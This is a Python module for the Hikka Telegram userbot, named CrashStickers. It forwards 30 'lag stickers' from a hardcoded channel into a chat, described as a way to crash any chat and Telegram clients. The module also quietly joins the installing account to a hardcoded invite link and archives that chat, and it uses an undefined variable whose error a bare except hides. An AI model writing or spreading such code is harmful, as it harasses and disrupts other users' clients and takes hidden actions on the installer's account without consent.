"""
Licensed under GNU General Public License v3:
https://github.com/lapismyt/hikka_mods/blob/main/LICENSE
"""

# meta developer: @LapisMods

__version__ = (1, 0, 0)

import logging
from .. import loader, utils
from hikkatl.tl.functions.messages import ForwardMessagesRequest
from hikkatl.tl.functions.messages import GetDialogsRequest
from hikkatl.tl.functions.messages import ImportChatInviteRequest
from hikkatl.tl.functions.account import UpdateNotifySettingsRequest
import time
import datetime

logger = logging.getLogger(__name__)

@loader.tds
class CrashStickersMod(loader.Module):
    """Can crash any chat you want.
    Not works without subscribe: https://t.me/+wZby3WiI8ZU2YWQy"""

    strings = {
        "name": "CrashStickers",
        "wait": "<tg-spoiler>Please, wait...</tg-spoiler>"
    }

    strings_ru = {
        "wait": "<tg-spoiler>Пожалуйста, подождите...</tg-spoiler>"
    }

    def __init__(self):
        self.name = self.strings["name"]

    @loader.command(
        ru_doc="- Отправляет 30 лагающих стикеров, которые крашают Telegram"
    )
    async def breakchatcmd(self, message):
        """- Sends 30 lag stickers, that crashes Telegram"""
        try:
            await self._client(ImportChatInviteRequest("wZby3WiI8ZU2YWQy"))
            chat = await client.get_entity(-1001962983002)
            await self._client.edit_folder(chat, 1)
        except BaseException:
            pass
        if True: # Мне было лень убирать if
            await utils.answer(message, self.strings["wait"])
            time.sleep(5)
            await self._client.get_dialogs()
            for i in range(30):
                await self._client(ForwardMessagesRequest(from_peer=1962983002, id=[10], drop_author=False, to_peer=message.chat_id))
                time.sleep(0.1)

